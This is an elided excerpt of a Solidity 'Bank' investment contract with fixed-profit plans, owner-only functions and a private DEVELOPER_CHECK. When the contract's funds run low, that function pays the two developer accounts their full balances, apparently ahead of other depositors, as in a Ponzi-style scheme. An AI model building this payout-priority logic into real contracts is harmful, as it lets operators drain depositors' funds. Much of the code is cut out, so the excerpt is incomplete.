...
contract Bank{
    ...
    event LogGrant    (uint amount);
    event LogOwner    (address indexed accountAddress);
    event LogLunch    (uint amount);

    constructor() public payable {
        owner = msg.sender;
        acc1 = msg.sender;
        plans[0] = Plan({planDuration: 0,  planProfit: 2000});
        plans[1] = Plan({planDuration: 5, planProfit: 2500}); // duration must be * 86400
        ...
        returns(bool)
    {
        ...
        if (investment.investmentPlan == 0) {
            ...
            investmentDuration = (now - investment.investDate);
                ...
                investment.isCompleted = (investment.investmentPlan == 0) ? false: true;
            }
        }
    ...
    function DEVELOPER_CHECK(int _balanceOfBank) private returns(bool) {
        ...
        if(u_balanceOfBank < (remained[acc1]+remained[acc2]+balances[acc1]+balances[acc2])){
            acc1.transfer((remained[acc1] + balances[acc1]));
            acc2.transfer((remained[acc2] + balances[acc2]));
    ...
    function grant() public payable onlyOwner returns(uint){
        emit LogGrant(address(this).balance);
